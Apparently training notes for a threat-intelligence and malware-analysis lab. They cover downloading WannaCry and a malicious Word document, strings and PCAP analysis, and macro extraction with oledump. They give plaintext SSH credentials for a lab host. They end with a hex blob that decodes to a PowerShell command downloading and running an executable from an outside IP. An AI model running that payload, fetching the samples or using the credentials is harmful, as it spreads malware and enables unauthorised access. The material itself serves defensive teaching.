@@ -1,0 +1,348 @@
+###################################
+# Fusion Cell/Threat Intelligence #
+###################################
+	
+
+
+
+Mission/Target
+--------------
+- External (company hired to do threat intel for you)
+	- Generic keyword searches for terms that are relevant to your organization
+	
+
+- Internal
+	- Analyze indicators and artifacts, and distribute relevant info to appropriate business units
+	- Analyze potential threat actors that may target your organization
+	
+
+
+
+Technical Components
+--------------------
+
+Data to analyze:
+	- Feeds (who do you want listen to?)
+		https://github.com/P3t3rp4rk3r/Threat_Intelligence#sources
+
+
+	- Formats (what language do you want to speak)
+		https://github.com/P3t3rp4rk3r/Threat_Intelligence#formats
+			
+	
+- Platforms
+	- How do we talk to each other and other people (email, phone, postcard)
+	
+	Open source platforms
+	https://github.com/OpenCTI-Platform/opencti
+
+	
+- Secure Linux OS (Quebes/Tails)
+	Quebes/Tails
+	https://www.fossmint.com/best-linux-distros-for-privacy-security/
+	
+- Non-Attrib network
+		Purchase a seperate business internet connection
+
+
+
+
+Sample Reports
+--------------
+- Reports
+	https://github.com/fdiskyou/threat-INTel
+
+
+
+APT Research
+------------
+https://github.com/aptnotes/data
+https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections
+https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml#
+
+
+
+Threat Analysts Online tools/dashboards
+---------------------------------------
+https://start.me/p/rxRbpo/ti
+
+
+
+---------------------------------------------------------------------------------------------
+
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ 
+Host Name:          149.28.201.171
+protocol:           ssh
+port:               22
+username:           cti
+password:           I-love-CTI-123!
+
+mkdir ~/yourname
+
+cd ~/yourname
+ 
+wget http://45.63.104.73/wannacry.zip
+ 
+unzip wannacry.zip
+     **** password is infected ***
+ 
+file wannacry.exe
+ 
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+-----------------------------------------------------------------------
+ 
+
+
+Reference:
+https://www.mcafee.com/blogs/other-blogs/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+
+
+
+1. Read the advisory
+2. Check Threat Intel Sites
+   - https://www.threatminer.org/
+3. Upload to sandbox (VirusTotal)
+4. Upload to dynamic sandbox (https://hybrid-analysis.com/)
+5. Upload PCAP to analysis platform (https://packettotal.com/)
+
+
+
+
+                            ###############################
+----------- ############### # Threat Hunting on the wire  # ############### -----------
+                            ###############################
+ 
+ 
+ 
+ 
+##################################################################
+# Analyzing a PCAP Prads                                         #
+# Note: run as regular user                                      #
+##################################################################
+ 
+---------------------------Type this as a regular user----------------------------------
+cd ~/yourname
+ 
+mkdir pcap_analysis/
+ 
+cd ~/yourname/pcap_analysis/
+ 
+mkdir prads
+ 
+cd ~/yourname/pcap_analysis/prads
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+prads -r suspicious-time.pcap -l prads-asset.log
+ 
+cat prads-asset.log | less
+ 
+cat prads-asset.log | grep SYN | grep -iE 'windows|linux'
+ 
+cat prads-asset.log | grep CLIENT | grep -iE 'safari|firefox|opera|chrome'
+ 
+cat prads-asset.log | grep SERVER | grep -iE 'apache|linux|ubuntu|nginx|iis'
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################
+# PCAP Analysis with ChaosReader #
+# Note: run as regular user      #
+##################################
+---------------------------Type this as a regular user----------------------------------
+cd ~/yourname
+ 
+mkdir -p pcap_analysis/chaos_reader/
+ 
+cd ~/pcap_analysis/chaos_reader/
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+wget http://45.63.104.73/chaosreader.pl
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+ 
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u | awk '{print $5}' > url.lst
+ 
+ 
+wget https://raw.githubusercontent.com/Open-Sec/forensics-scripts/master/check-urls-virustotal.py
+ 
+ 
+python check-urls-virustotal.py url.lst
+ 
+ 
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#############################
+# PCAP Analysis with tshark #
+# Note: run as regular user #
+#############################
+---------------------------Type this as a regular user---------------------------------
+cd ~/yourname/pcap_analysis/
+ 
+mkdir tshark
+ 
+cd ~/yourname/pcap_analysis/tshark
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+tshark -i ens3 -r suspicious-time.pcap -qz io,phs
+ 
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+ 
+tshark -r suspicious-time.pcap -Y "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+ 
+tshark -r suspicious-time.pcap -Y "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+ 
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
+ 
+whois rapidshare.com.eyu32.ru
+ 
+whois sploitme.com.cn
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+ 
+tshark -r suspicious-time.pcap -qz http_req,tree
+ 
+tshark -r suspicious-time.pcap -Y "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+------------------------------------------------------------------------
+ 
+ 
+###############################
+# Extracting files from PCAPs #
+# Note: run as regular user   #
+###############################
+---------------------------Type this as a regular user---------------------------------
+cd ~/yourname/pcap_analysis/
+ 
+mkdir extract_files
+ 
+cd extract_files
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+foremost -v -i suspicious-time.pcap
+ 
+cd output
+ 
+ls
+ 
+cat audit.txt
+ 
+cd exe
+ 
+wget https://raw.githubusercontent.com/GREEKYnikhilsharma/Xen0ph0n-VirusTotal_API_Tool-Python3/master/vtlite.py
+ 
+******* NOTE: You will need to put your virustotal API key in vtlite.py *******
+ 
+for f in *.exe; do python3 vtlite.py -s $f; done
+---------------------------------------------------------------------------------------
+ 
+ 
+
+
+
+
+
+
+
+##############################################
+# Introduction to more sophisticated malware #
+##############################################
+
+
+---------------------------Type This-----------------------------------
+cd ~/yourname
+
+mkdir vba_malware
+
+cd vba_malware
+ 
+wget https://infosecaddicts-files.s3.amazonaws.com/064016.zip
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+-----------------------------------------------------------------------
+ 
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
